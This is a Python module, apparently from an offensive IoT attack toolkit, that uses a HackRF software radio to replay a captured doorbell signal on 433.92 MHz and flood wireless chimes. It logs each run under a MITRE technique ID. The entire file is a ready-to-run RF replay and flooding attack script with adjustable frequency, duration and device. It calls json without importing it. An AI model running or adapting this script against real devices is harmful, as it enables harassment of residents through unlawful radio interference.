#!/usr/bin/env python3
# modules/attacks/rf_doorbell_spammer.py

import os
import time
import argparse
import subprocess
from datetime import datetime

MITRE_TTP = "T0810"
LOG_FILE = "results/doorbell_spam_log.json"

def log_attack(freq, duration):
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "frequency": freq,
        "duration_sec": duration,
        "ttp": MITRE_TTP
    }
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def spam(freq, duration, device):
    try:
        subprocess.run(["hackrf_transfer", "-t", "payloads/doorbell_signal.bin",
                        "-f", str(freq), "-x", "20", "-d", device, "-s", "2000000", "-a", "1", "-n", str(duration * 2000000)],
                       check=True)
        log_attack(freq, duration)
        print(f"[✓] Spammed RF doorbell freq {freq}Hz for {duration}s")
    except Exception as e:
        print(f"[!] RF spam failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spam RF doorbell signal to flood IoT chimes")
    parser.add_argument("--freq", type=int, default=433920000, help="Frequency in Hz")
    parser.add_argument("--duration", type=int, default=10, help="Duration in seconds")
    parser.add_argument("--device", default="0", help="HackRF device index")
    args = parser.parse_args()
    spam(args.freq, args.duration, args.device)
